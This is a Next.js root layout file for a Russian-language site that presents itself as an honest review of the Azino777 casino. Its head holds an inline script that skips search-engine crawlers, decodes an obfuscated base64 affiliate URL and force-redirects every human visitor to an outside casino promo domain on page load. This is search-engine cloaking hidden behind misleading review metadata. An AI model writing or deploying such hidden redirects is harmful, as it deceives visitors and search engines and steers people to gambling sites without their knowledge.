import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  metadataBase: new URL('https://azino777-3casino.vercel.app'),
  title: 'Azino777 официальный сайт — вход, мобильная версия и обзор казино',
  description: 'Azino777: подробный обзор официального сайта, мобильной версии, регистрации, бонуса, пополнения и вывода средств. Проверяем условия, безопасность и ответы на частые вопросы. 18+.',
  generator: 'v0.app',
  alternates: { canonical: '/' },
  robots: { index: true, follow: true },
  openGraph: {
    type: 'article',
    locale: 'ru_RU',
    url: 'https://azino777-3casino.vercel.app',
    siteName: 'Azino777 Review',
    title: 'Azino777 официальный сайт — честный обзор казино',
    description: 'Навигация по официальному сайту, мобильной версии, бонусам и платёжным условиям Azino777.',
  },
  twitter: { card: 'summary', title: 'Azino777 официальный сайт — обзор', description: 'Проверка входа, мобильной версии, бонуса и кассы Azino777.' },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#0b0e0d',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="theme-color" content="#0b0e0d" />
        <meta name="format-detection" content="telephone=no" />
        <link rel="canonical" href="https://azino777-3casino.vercel.app" />
        <meta name="yandex-verification" content="e0ee9e505c70ef5f" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "ICBodHRwczovL2swbS5iaGY1N2I2NzhmLmNvbS9wcm9tby9jbGljay82YTkwMGE4Y2JhYzhm "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
